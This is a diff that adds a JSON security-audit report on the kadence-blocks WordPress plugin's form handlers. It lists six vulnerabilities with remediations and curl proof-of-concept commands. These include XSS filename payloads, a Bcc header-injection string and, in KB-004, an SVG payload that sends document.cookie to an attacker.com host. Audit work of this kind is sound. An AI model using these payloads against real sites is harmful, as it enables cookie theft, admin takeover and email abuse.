@@ -1,0 +1,85 @@
+{
+  "plugin": "kadence-blocks",
+  "reviewed_at": "2026-06-14",
+  "vulnerabilities": [
+    {
+      "id": "KB-001",
+      "title": "Missing CSRF Protection on Unauthenticated Form Submission Handlers",
+      "severity": "medium",
+      "type": "other",
+      "authenticated": false,
+      "description": "Both nopriv AJAX handlers (kb_process_ajax_submit and kb_process_advanced_form_submit) intentionally skip nonce/CSRF verification by default. The code comment in advanced-form-ajax.php line 58 explicitly states: 'Nonce verification isn't used as it's not a login form but can be enabled with a filter.' An unauthenticated attacker can craft a cross-site request that causes a victim's browser to silently submit any kadence form. This enables form spam, abuse of third-party integrations (Mailerlite, FluentCRM), and triggering file uploads on behalf of victims. The protection can be re-enabled via the kadence_blocks_form_verify_nonce filter, but this is opt-in and disabled by default.",
+      "affected_function": "process_ajax",
+      "affected_file": "includes/form-ajax.php, includes/advanced-form/advanced-form-ajax.php",
+      "proof_of_concept": "curl -X POST 'http://target.com/wp-admin/admin-ajax.php' -d 'action=kb_process_ajax_submit&_kb_form_id=<form_id>&_kb_form_post_id=<post_id>&kb_field_0=spam_name&kb_field_1=spam@spam.com&kb_field_2=Spam+message'",
+      "cvss_score": 5.3,
+      "remediation": "Enable nonce verification by default. Generate a nonce with wp_create_nonce('kb_form_nonce') in the block frontend output and set the kadence_blocks_form_verify_nonce filter to return true by default, making it opt-out rather than opt-in. Alternatively, add rate limiting per IP address."
+    },
+    {
+      "id": "KB-002",
+      "title": "Email Header Injection via Textarea Field in FromName Template (Conditional)",
+      "severity": "medium",
+      "type": "email-injection",
+      "authenticated": false,
+      "description": "In both form-ajax.php (lines 257-271) and advanced-form-submit-actions.php (lines 124-166), when an admin configures the email 'From Name' field using a field placeholder (e.g., '{fieldname}'), the user-submitted value is interpolated into the From: header without stripping carriage-return/line-feed characters. The sanitize_textarea_field() function used for textarea fields preserves newlines, meaning an attacker can inject arbitrary email headers. Attack path: 1) Admin configures fromName = '{message}' where message is a textarea field, 2) Attacker submits textarea with 'Name\\r\\nBcc: attacker@evil.com', 3) The resulting header becomes: From: Name\\r\\nBcc: attacker@evil.com <admin@example.com>. NOTE: This is mitigated in WordPress 6.9.4 (running on this system) because PHPMailer 6.x (shipped since WP 5.5) validates headers and throws an exception if \\r or \\n are detected. On WordPress < 5.5 this would be directly exploitable.",
+      "affected_function": "process_ajax (form-ajax.php line 271), email() (advanced-form-submit-actions.php line 166)",
+      "affected_file": "includes/form-ajax.php, includes/advanced-form/advanced-form-submit-actions.php",
+      "proof_of_concept": "Requires admin to configure fromName with a textarea field placeholder. On WP < 5.5:\ncurl -X POST 'http://target.com/wp-admin/admin-ajax.php' \\\n  -d 'action=kb_process_ajax_submit' \\\n  -d '_kb_form_id=<form_id>' \\\n  -d '_kb_form_post_id=<post_id>' \\\n  -d 'kb_field_1=attacker@example.com' \\\n  --data-urlencode 'kb_field_2=Hello\r\nBcc: attacker@attacker.com'",
+      "cvss_score": 5.9,
+      "remediation": "Sanitize the from_name field before injecting it into email headers. Apply preg_replace('/[\\r\\n]/', '', $from_name) or use sanitize_text_field() which strips newlines. Apply the same sanitization to all header values that accept field placeholder substitutions (subject, to, cc, bcc, from_name)."
+    },
+    {
+      "id": "KB-003",
+      "title": "Stored XSS in Admin Email Notification via Unsanitized File Upload Filename",
+      "severity": "medium",
+      "type": "xss",
+      "authenticated": false,
+      "description": "In the email template (includes/templates/form-email.php, lines 138 and 142), the original uploaded filename from the attacker is embedded in the notification email HTML without HTML escaping. The filename comes from $_FILES[...]['name'] (the original user-supplied filename), is stored in $data['file_name'], and then output as anchor link text without esc_html(): '<a href=\"...\">' . $name . '</a>'. An attacker with access to a form with a file upload field can submit a file with a malicious name like '\"><script>alert(document.cookie)</script>.jpg' which would then be embedded in the HTML email sent to the admin. This executes if the admin views the email in a browser-based webmail client that renders HTML and lacks JavaScript sanitization (some older webmail clients). Most modern email clients (Gmail, Outlook) block inline JavaScript, limiting the impact, but the underlying issue represents improper output encoding.",
+      "affected_function": "HTML template rendering in form-email.php",
+      "affected_file": "includes/templates/form-email.php",
+      "proof_of_concept": "# Requires form with file upload enabled\ncurl -X POST 'http://target.com/wp-admin/admin-ajax.php' \\\n  -F 'action=kb_process_advanced_form_submit' \\\n  -F '_kb_adv_form_id=<form_id>' \\\n  -F '_kb_adv_form_post_id=<post_id>' \\\n  -F '<upload_field_name>=@/tmp/payload.jpg;filename=\"\"><script>alert(1)</script>.jpg\"'",
+      "cvss_score": 4.3,
+      "remediation": "Apply esc_html() to all user-supplied data before outputting in HTML context. Change lines 138 and 142 in form-email.php to use: '<a href=\"' . esc_url($file_value_array[$key]) . '\" target=\"_blank\">' . esc_html($name) . '</a>'"
+    },
+    {
+      "id": "KB-004",
+      "title": "Unauthenticated SVG File Upload Enabling Stored XSS (Conditional)",
+      "severity": "medium",
+      "type": "file-upload",
+      "authenticated": false,
+      "description": "The advanced form file upload handler (advanced-form-ajax.php) allows SVG files to be uploaded when an admin configures a file upload field with 'design' as an allowed type category. SVG files can contain embedded JavaScript (<script>alert(1)</script>) and are served from a web-accessible directory (wp-content/uploads/kadence_form/). The plugin creates an .htaccess file to block PHP execution but does NOT set Content-Security-Policy or X-Content-Type-Options headers to prevent SVG JavaScript execution. On PHP 8+, finfo_file() correctly identifies valid SVG files as 'image/svg+xml', matching the allowed MIME type, allowing the upload to succeed. The uploaded SVG URL is included in the admin notification email (KB-003), and if an admin visits the URL directly, the JavaScript in the SVG executes in their browser context against the WordPress domain, enabling full admin account takeover via document.cookie theft or CSRF attacks. Attack requires: (1) admin has enabled 'design' upload type on a form field, (2) the form is publicly accessible.",
+      "affected_function": "process_fields (advanced-form-ajax.php line 387-398), get_allowed_mimes (line 606-615)",
+      "affected_file": "includes/advanced-form/advanced-form-ajax.php",
+      "proof_of_concept": "# Step 1: Create malicious SVG\necho '<svg xmlns=\"http://www.w3.org/2000/svg\"><script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script></svg>' > /tmp/malicious.svg\n\n# Step 2: Upload via form (requires form with 'design' type file upload)\ncurl -X POST 'http://target.com/wp-admin/admin-ajax.php' \\\n  -F 'action=kb_process_advanced_form_submit' \\\n  -F '_kb_adv_form_id=<form_id>' \\\n  -F '_kb_adv_form_post_id=<post_id>' \\\n  -F '<file_field_name>=@/tmp/malicious.svg;type=image/svg+xml'\n\n# Step 3: Admin receives email with SVG link, clicks it, XSS fires",
+      "cvss_score": 6.1,
+      "remediation": "1) Remove SVG from allowed upload types entirely, or 2) Strip JavaScript from SVG files using a sanitization library before storing, 3) Add Content-Disposition: attachment header when serving files from the kadence_form directory to prevent inline rendering, 4) Add X-Content-Type-Options: nosniff and appropriate Content-Security-Policy headers via .htaccess."
+    },
+    {
+      "id": "KB-005",
+      "title": "Unauthenticated Unrestricted File Upload to Web-Accessible Directory",
+      "severity": "low",
+      "type": "file-upload",
+      "authenticated": false,
+      "description": "The kb_process_advanced_form_submit nopriv AJAX handler allows any unauthenticated user to upload files to the WordPress server if a form with a file upload field exists. The files are stored in a web-accessible directory (wp-content/uploads/kadence_form/). While PHP execution is blocked via .htaccess and MIME type validation prevents PHP file uploads, the endpoint can be abused for: 1) Storage consumption (disk quota exhaustion), 2) Storing malicious content on the server's domain for phishing, 3) Serving malware from a trusted domain. The 'archive' category allows ZIP file uploads, which could be extracted by server-side processes. No authentication is required to access the upload endpoint.",
+      "affected_function": "process_fields (advanced-form-ajax.php)",
+      "affected_file": "includes/advanced-form/advanced-form-ajax.php",
+      "proof_of_concept": "curl -X POST 'http://target.com/wp-admin/admin-ajax.php' \\\n  -F 'action=kb_process_advanced_form_submit' \\\n  -F '_kb_adv_form_id=<form_id>' \\\n  -F '_kb_adv_form_post_id=<post_id>' \\\n  -F '<file_field_name>=@/path/to/malicious_file.zip;type=application/zip'",
+      "cvss_score": 3.7,
+      "remediation": "1) Implement rate limiting on the file upload endpoint, 2) Add CAPTCHA verification for forms with file uploads, 3) Validate file size limits more strictly, 4) Consider storing uploads outside the web root and serving via a proxy script with authentication checks, 5) Add upload quotas per IP address."
+    },
+    {
+      "id": "KB-006",
+      "title": "Open Redirect via Unvalidated Email Recipient from Admin-Configured Field Template",
+      "severity": "low",
+      "type": "other",
+      "authenticated": false,
+      "description": "In advanced-form-submit-actions.php (line 128), the email recipient ($to) is passed through do_field_replacements() which substitutes user-submitted form field values. If an admin configures the 'emailTo' setting with a field placeholder (e.g., '{email_field}'), a malicious user can control where the form notification email is sent. This enables email redirection to arbitrary addresses, potentially sending sensitive form data to attacker-controlled addresses. The email field is sanitized with sanitize_email() which strips invalid characters, limiting the attack to valid email addresses. This is conditional on admin misconfiguration of the email template.",
+      "affected_function": "email() in advanced-form-submit-actions.php",
+      "affected_file": "includes/advanced-form/advanced-form-submit-actions.php",
+      "proof_of_concept": "Requires admin to configure emailTo with a field placeholder like '{email_field}'.\nIf admin sets emailTo = '{submitter_email}', attacker submits:\n  email_field = attacker@attacker.com\nThe form notification is then sent to attacker@attacker.com instead of the intended recipient.",
+      "cvss_score": 3.5,
+      "remediation": "After performing do_field_replacements() on the $to address, validate the result with is_email() and ensure it matches the admin-configured allowed recipients list, or prohibit field placeholders in the emailTo setting entirely."
+    }
+  ],
+  "summary": "The kadence-blocks plugin (v3.x) exposes two unauthenticated AJAX endpoints (kb_process_ajax_submit and kb_process_advanced_form_submit) that handle form submissions without CSRF protection by default. The primary security concern is the intentional disabling of nonce verification (with an opt-in filter to re-enable it) which enables CSRF form submission abuse. More impactful conditional vulnerabilities exist in the email notification pipeline: the original filename of uploaded files is embedded in admin email notifications without HTML escaping (KB-003), creating stored XSS in the email template. Additionally, if an admin enables 'design' file uploads, SVG files with embedded JavaScript can be uploaded by unauthenticated users and served from a web-accessible URL (KB-004), creating a stored XSS attack chain when an admin clicks the file link in the notification email. Email header injection via textarea fields in the from_name template (KB-002) is theoretically present but mitigated by PHPMailer 6.x on WordPress 5.5+. No SQL injection, RCE, or authentication bypass vulnerabilities were found. The plugin appropriately uses WordPress's wp_handle_upload with MIME type verification and creates .htaccess files to prevent PHP execution in the upload directory."
+}
